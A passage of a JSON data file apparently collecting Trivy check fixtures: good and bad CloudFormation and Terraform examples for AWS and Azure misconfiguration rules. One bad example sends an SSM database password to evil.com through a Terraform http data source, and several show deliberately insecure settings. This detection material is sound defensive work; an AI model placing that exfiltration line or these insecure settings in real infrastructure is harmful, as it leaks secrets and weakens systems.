        "rule_id": "AWS-SNS-TOPIC_ENCRYPTION_WITH_CMK",
        "title": "Topic Encryption With Cmk",
        "provider": "aws",
        "service": "sns",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodTopic:\n          Type: AWS::SQS::Topic\n          Properties:\n            KmsMasterKeyId: some-key\n            TopicName: blah\n  bad:\n    - |-\n      Resources:\n        BadTopic:\n          Type: AWS::SNS::Topic\n          Properties:\n            KmsMasterKeyId: alias/aws/sns\n            TopicName: blah\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse\n  good:\n    - |-\n      resource \"aws_sns_topic\" \"good_example\" {\n        kms_master_key_id = \"/blah\"\n      }\n  bad:\n    - |-\n      resource \"aws_sns_topic\" \"bad_example\" {\n        kms_master_key_id = \"alias/aws/sns\"\n      }\n",
        "file_name": "topic_encryption_with_cmk.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sns/topic_encryption_with_cmk.yaml",
        "local_path": "aws/sns/topic_encryption_with_cmk.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodTopic:\n    Type: AWS::SQS::Topic\n    Properties:\n      KmsMasterKeyId: some-key\n      TopicName: blah"
            ],
            "bad": [
              "Resources:\n  BadTopic:\n    Type: AWS::SNS::Topic\n    Properties:\n      KmsMasterKeyId: alias/aws/sns\n      TopicName: blah"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse"
            ],
            "good": [
              "resource \"aws_sns_topic\" \"good_example\" {\n  kms_master_key_id = \"/blah\"\n}"
            ],
            "bad": [
              "resource \"aws_sns_topic\" \"bad_example\" {\n  kms_master_key_id = \"alias/aws/sns\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SQS-ENABLE_QUEUE_ENCRYPTION",
        "title": "Enable Queue Encryption",
        "provider": "aws",
        "service": "sqs",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of queue\n\n      Resources:\n        Queue:\n          Type: AWS::SQS::Queue\n          Properties:\n            KmsMasterKeyId: some-key\n            QueueName: my-queue\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of queue\n\n      Resources:\n        Queue:\n          Type: AWS::SQS::Queue\n          Properties:\n            QueueName: my-queue\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse\n  good:\n    - |-\n      resource \"aws_sqs_queue\" \"good_example\" {\n        kms_master_key_id = \"/blah\"\n      }\n    - |-\n      resource \"aws_sqs_queue\" \"terraform_queue\" {\n        name                    = \"terraform-example-queue\"\n        sqs_managed_sse_enabled = true\n      }\n    - |-\n      resource \"aws_sqs_queue\" \"terraform_queue\" {\n        name              = \"terraform-example-queue\"\n        kms_master_key_id = \"alias/aws/sqs\"\n      }\n  bad:\n    - |-\n      resource \"aws_sqs_queue\" \"bad_example\" {\n        # no key specified\n      }\n",
        "file_name": "enable_queue_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sqs/enable_queue_encryption.yaml",
        "local_path": "aws/sqs/enable_queue_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of queue\n\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      KmsMasterKeyId: some-key\n      QueueName: my-queue"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of queue\n\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      QueueName: my-queue"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse"
            ],
            "good": [
              "resource \"aws_sqs_queue\" \"good_example\" {\n  kms_master_key_id = \"/blah\"\n}",
              "resource \"aws_sqs_queue\" \"terraform_queue\" {\n  name                    = \"terraform-example-queue\"\n  sqs_managed_sse_enabled = true\n}",
              "resource \"aws_sqs_queue\" \"terraform_queue\" {\n  name              = \"terraform-example-queue\"\n  kms_master_key_id = \"alias/aws/sqs\"\n}"
            ],
            "bad": [
              "resource \"aws_sqs_queue\" \"bad_example\" {\n  # no key specified\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SQS-NO_WILDCARDS_IN_POLICY_DOCUMENTS",
        "title": "No Wildcards In Policy Documents",
        "provider": "aws",
        "service": "sqs",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of queue policy\n\n      Resources:\n        MyQueue:\n          Type: AWS::SQS::Queue\n          Properties:\n            Name: something\n\n        SampleSQSPolicy:\n          Type: AWS::SQS::QueuePolicy\n          Properties:\n            PolicyDocument:\n              Statement:\n                - Action:\n                    - SQS:SendMessage\n                    - SQS:ReceiveMessage\n                  Effect: Allow\n                  Principal:\n                    AWS:\n                      - \"111122223333\"\n                  Resource: arn:aws:sqs:us-east-2:444455556666:queue2\n            Queues:\n              - !Ref MyQueue\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of queue policy\n\n      Resources:\n        MyQueue:\n          Type: AWS::SQS::Queue\n          Properties:\n            Name: something\n\n        SampleSQSPolicy:\n          Type: AWS::SQS::QueuePolicy\n          Properties:\n            PolicyDocument:\n              Statement:\n                - Action:\n                    - '*'\n                  Effect: Allow\n                  Principal:\n                    AWS:\n                      - \"111122223333\"\n                  Resource: arn:aws:sqs:us-east-2:444455556666:queue2\n            Queues:\n              - !Ref MyQueue\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue_policy\n  good:\n    - |-\n      resource \"aws_sqs_queue_policy\" \"good_example\" {\n        queue_url = aws_sqs_queue.q.id\n\n        policy = <<POLICY\n       {\n         \"Statement\": [\n           {\n             \"Effect\": \"Allow\",\n             \"Principal\": \"*\",\n             \"Action\": \"sqs:SendMessage\"\n           }\n         ]\n       }\n       POLICY\n      }\n  bad:\n    - |-\n      resource \"aws_sqs_queue_policy\" \"bad_example\" {\n        queue_url = aws_sqs_queue.q.id\n\n        policy = <<POLICY\n       {\n         \"Statement\": [\n           {\n             \"Effect\": \"Allow\",\n             \"Principal\": \"*\",\n             \"Action\": \"*\"\n           }\n         ]\n       }\n       POLICY\n      }\n",
        "file_name": "no_wildcards_in_policy_documents.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sqs/no_wildcards_in_policy_documents.yaml",
        "local_path": "aws/sqs/no_wildcards_in_policy_documents.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of queue policy\n\nResources:\n  MyQueue:\n    Type: AWS::SQS::Queue\n    Properties:\n      Name: something\n\n  SampleSQSPolicy:\n    Type: AWS::SQS::QueuePolicy\n    Properties:\n      PolicyDocument:\n        Statement:\n          - Action:\n              - SQS:SendMessage\n              - SQS:ReceiveMessage\n            Effect: Allow\n            Principal:\n              AWS:\n                - \"111122223333\"\n            Resource: arn:aws:sqs:us-east-2:444455556666:queue2\n      Queues:\n        - !Ref MyQueue"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of queue policy\n\nResources:\n  MyQueue:\n    Type: AWS::SQS::Queue\n    Properties:\n      Name: something\n\n  SampleSQSPolicy:\n    Type: AWS::SQS::QueuePolicy\n    Properties:\n      PolicyDocument:\n        Statement:\n          - Action:\n              - '*'\n            Effect: Allow\n            Principal:\n              AWS:\n                - \"111122223333\"\n            Resource: arn:aws:sqs:us-east-2:444455556666:queue2\n      Queues:\n        - !Ref MyQueue"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue_policy"
            ],
            "good": [
              "resource \"aws_sqs_queue_policy\" \"good_example\" {\n  queue_url = aws_sqs_queue.q.id\n\n  policy = <<POLICY\n {\n   \"Statement\": [\n     {\n       \"Effect\": \"Allow\",\n       \"Principal\": \"*\",\n       \"Action\": \"sqs:SendMessage\"\n     }\n   ]\n }\n POLICY\n}"
            ],
            "bad": [
              "resource \"aws_sqs_queue_policy\" \"bad_example\" {\n  queue_url = aws_sqs_queue.q.id\n\n  policy = <<POLICY\n {\n   \"Statement\": [\n     {\n       \"Effect\": \"Allow\",\n       \"Principal\": \"*\",\n       \"Action\": \"*\"\n     }\n   ]\n }\n POLICY\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SQS-QUEUE_ENCRYPTION_WITH_CMK",
        "title": "Queue Encryption With Cmk",
        "provider": "aws",
        "service": "sqs",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of queue\n\n      Resources:\n        Queue:\n          Type: AWS::SQS::Queue\n          Properties:\n            KmsMasterKeyId: some-key\n            QueueName: my-queue\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of queue\n\n      Resources:\n        Queue:\n          Type: AWS::SQS::Queue\n          Properties:\n            KmsMasterKeyId: alias/aws/sqs\n            QueueName: my-queue\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse\n  good:\n    - |-\n      resource \"aws_sqs_queue\" \"good_example\" {\n        kms_master_key_id = \"/blah\"\n      }\n  bad:\n    - |-\n      resource \"aws_sqs_queue\" \"bad_example\" {\n        kms_master_key_id = \"alias/aws/sqs\"\n      }\n",
        "file_name": "queue_encryption_with_cmk.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sqs/queue_encryption_with_cmk.yaml",
        "local_path": "aws/sqs/queue_encryption_with_cmk.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of queue\n\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      KmsMasterKeyId: some-key\n      QueueName: my-queue"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of queue\n\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      KmsMasterKeyId: alias/aws/sqs\n      QueueName: my-queue"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse"
            ],
            "good": [
              "resource \"aws_sqs_queue\" \"good_example\" {\n  kms_master_key_id = \"/blah\"\n}"
            ],
            "bad": [
              "resource \"aws_sqs_queue\" \"bad_example\" {\n  kms_master_key_id = \"alias/aws/sqs\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SSM-AVOID_LEAKS_VIA_HTTP",
        "title": "Avoid Leaks Via Http",
        "provider": "aws",
        "service": "ssm",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  good:\n    - |-\n      resource \"aws_ssm_parameter\" \"db_password\" {\n        name  = \"db_password\"\n        type  = \"SecureString\"\n        value = var.db_password\n      }\n  bad:\n    - |-\n      resource \"aws_ssm_parameter\" \"db_password\" {\n        name  = \"db_password\"\n        type  = \"SecureString\"\n        value = var.db_password\n      }\n\n      data \"http\" \"not_exfiltrating_data_honest\" {\n        url = \"https://evil.com/?p=${aws_ssm_parameter.db_password.value}\"\n      }\n",
        "file_name": "avoid_leaks_via_http.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ssm/avoid_leaks_via_http.yaml",
        "local_path": "aws/ssm/avoid_leaks_via_http.yaml",
        "parsed_metadata": {
          "terraform": {
            "good": [
              "resource \"aws_ssm_parameter\" \"db_password\" {\n  name  = \"db_password\"\n  type  = \"SecureString\"\n  value = var.db_password\n}"
            ],
            "bad": [
              "resource \"aws_ssm_parameter\" \"db_password\" {\n  name  = \"db_password\"\n  type  = \"SecureString\"\n  value = var.db_password\n}\n\ndata \"http\" \"not_exfiltrating_data_honest\" {\n  url = \"https://evil.com/?p=${aws_ssm_parameter.db_password.value}\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SSM-SECRET_USE_CUSTOMER_KEY",
        "title": "Secret Use Customer Key",
        "provider": "aws",
        "service": "ssm",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of ingress rule\n\n      Resources:\n        Secret:\n          Type: AWS::SecretsManager::Secret\n          Properties:\n            Description: secret\n            KmsKeyId: my-key-id\n            Name: blah\n            SecretString: don't tell anyone\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of secret\n\n      Resources:\n        BadSecret:\n          Type: AWS::SecretsManager::Secret\n          Properties:\n            Description: secret\n            Name: blah\n            SecretString: don't tell anyone\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/secretsmanager_secret#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"secrets\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_secretsmanager_secret\" \"good_example\" {\n        name       = \"lambda_password\"\n        kms_key_id = aws_kms_key.secrets.arn\n      }\n  bad:\n    - |-\n      resource \"aws_secretsmanager_secret\" \"bad_example\" {\n        name = \"lambda_password\"\n      }\n    - |-\n      resource \"aws_secretsmanager_secret\" \"good_example\" {\n        name       = \"lambda_password\"\n        kms_key_id = \"alias/aws/secretsmanager\"\n      }\n",
        "file_name": "secret_use_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ssm/secret_use_customer_key.yaml",
        "local_path": "aws/ssm/secret_use_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of ingress rule\n\nResources:\n  Secret:\n    Type: AWS::SecretsManager::Secret\n    Properties:\n      Description: secret\n      KmsKeyId: my-key-id\n      Name: blah\n      SecretString: don't tell anyone"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of secret\n\nResources:\n  BadSecret:\n    Type: AWS::SecretsManager::Secret\n    Properties:\n      Description: secret\n      Name: blah\n      SecretString: don't tell anyone"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/secretsmanager_secret#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"secrets\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_secretsmanager_secret\" \"good_example\" {\n  name       = \"lambda_password\"\n  kms_key_id = aws_kms_key.secrets.arn\n}"
            ],
            "bad": [
              "resource \"aws_secretsmanager_secret\" \"bad_example\" {\n  name = \"lambda_password\"\n}",
              "resource \"aws_secretsmanager_secret\" \"good_example\" {\n  name       = \"lambda_password\"\n  kms_key_id = \"alias/aws/secretsmanager\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-WORKSPACES-ENABLE_DISK_ENCRYPTION",
        "title": "Enable Disk Encryption",
        "provider": "aws",
        "service": "workspaces",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::WorkSpaces::Workspace\n          Properties:\n            RootVolumeEncryptionEnabled: true\n            UserVolumeEncryptionEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::WorkSpaces::Workspace\n          Properties:\n            RootVolumeEncryptionEnabled: false\n            UserVolumeEncryptionEnabled: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/workspaces_workspace#root_volume_encryption_enabled\n  good:\n    - |-\n      resource \"aws_workspaces_workspace\" \"good_example\" {\n        root_volume_encryption_enabled = true\n        user_volume_encryption_enabled = true\n      }\n  bad:\n    - |-\n      resource \"aws_workspaces_workspace\" \"bad_example\" {\n        # encryption attributes are missing\n      }\n    - |-\n      resource \"aws_workspaces_workspace\" \"bad_example\" {\n        root_volume_encryption_enabled = false\n        user_volume_encryption_enabled = false\n      }\n",
        "file_name": "enable_disk_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/workspaces/enable_disk_encryption.yaml",
        "local_path": "aws/workspaces/enable_disk_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::WorkSpaces::Workspace\n    Properties:\n      RootVolumeEncryptionEnabled: true\n      UserVolumeEncryptionEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::WorkSpaces::Workspace\n    Properties:\n      RootVolumeEncryptionEnabled: false\n      UserVolumeEncryptionEnabled: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/workspaces_workspace#root_volume_encryption_enabled"
            ],
            "good": [
              "resource \"aws_workspaces_workspace\" \"good_example\" {\n  root_volume_encryption_enabled = true\n  user_volume_encryption_enabled = true\n}"
            ],
            "bad": [
              "resource \"aws_workspaces_workspace\" \"bad_example\" {\n  # encryption attributes are missing\n}",
              "resource \"aws_workspaces_workspace\" \"bad_example\" {\n  root_volume_encryption_enabled = false\n  user_volume_encryption_enabled = false\n}"
            ]
          }
        }
      }
    ],
    "terraform_azure": [
      {
        "rule_id": "AZURE-APPSERVICE-ACCOUNT_IDENTITY_REGISTERED",
        "title": "Account Identity Registered",
        "provider": "azure",
        "service": "appservice",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#identity\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        identity {\n          type         = \"UserAssigned\"\n          identity_ids = \"webapp1\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n",
        "file_name": "account_identity_registered.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/account_identity_registered.yaml",
        "local_path": "azure/appservice/account_identity_registered.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#identity"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  identity {\n    type         = \"UserAssigned\"\n    identity_ids = \"webapp1\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-AUTHENTICATION_ENABLED",
        "title": "Authentication Enabled",
        "provider": "azure",
        "service": "appservice",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#enabled\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        auth_settings {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n",
        "file_name": "authentication_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/authentication_enabled.yaml",
        "local_path": "azure/appservice/authentication_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#enabled"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  auth_settings {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-ENABLE_HTTP2",
        "title": "Enable Http2",
        "provider": "azure",
        "service": "appservice",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#http2_enabled\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        site_config {\n          http2_enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n        site_config {\n          http2_enabled = false\n        }\n      }\n",
        "file_name": "enable_http2.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/enable_http2.yaml",
        "local_path": "azure/appservice/enable_http2.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#http2_enabled"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  site_config {\n    http2_enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}",
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  site_config {\n    http2_enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-ENFORCE_HTTPS",
        "title": "Enforce Https",
        "provider": "azure",
        "service": "appservice",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/function_app#https_only\n  good:\n    - |-\n      resource \"azurerm_function_app\" \"good_example\" {\n        name                       = \"test-azure-functions\"\n        location                   = azurerm_resource_group.example.location\n        resource_group_name        = azurerm_resource_group.example.name\n        app_service_plan_id        = azurerm_app_service_plan.example.id\n        storage_account_name       = azurerm_storage_account.example.name\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        os_type                    = \"linux\"\n        https_only                 = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_function_app\" \"bad_example\" {\n        name                       = \"test-azure-functions\"\n        location                   = azurerm_resource_group.example.location\n        resource_group_name        = azurerm_resource_group.example.name\n        app_service_plan_id        = azurerm_app_service_plan.example.id\n        storage_account_name       = azurerm_storage_account.example.name\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        os_type                    = \"linux\"\n      }\n",
        "file_name": "enforce_https.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/enforce_https.yaml",
        "local_path": "azure/appservice/enforce_https.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/function_app#https_only"
            ],
            "good": [
              "resource \"azurerm_function_app\" \"good_example\" {\n  name                       = \"test-azure-functions\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  app_service_plan_id        = azurerm_app_service_plan.example.id\n  storage_account_name       = azurerm_storage_account.example.name\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  os_type                    = \"linux\"\n  https_only                 = true\n}"
            ],
            "bad": [
              "resource \"azurerm_function_app\" \"bad_example\" {\n  name                       = \"test-azure-functions\"\n  location                   = azurerm_resource_group.example.location\n  resource_group_name        = azurerm_resource_group.example.name\n  app_service_plan_id        = azurerm_app_service_plan.example.id\n  storage_account_name       = azurerm_storage_account.example.name\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  os_type                    = \"linux\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-REQUIRE_CLIENT_CERT",
        "title": "Require Client Cert",
        "provider": "azure",
        "service": "appservice",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#client_cert_enabled\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n        client_cert_enabled = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n        client_cert_enabled = false\n      }\n",
        "file_name": "require_client_cert.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/require_client_cert.yaml",
        "local_path": "azure/appservice/require_client_cert.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#client_cert_enabled"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  client_cert_enabled = true\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}",
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  client_cert_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "azure",
        "service": "appservice",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#min_tls_version\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        site_config {\n          min_tls_version = \"1.2\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        site_config {\n          min_tls_version = \"1.0\"\n        }\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
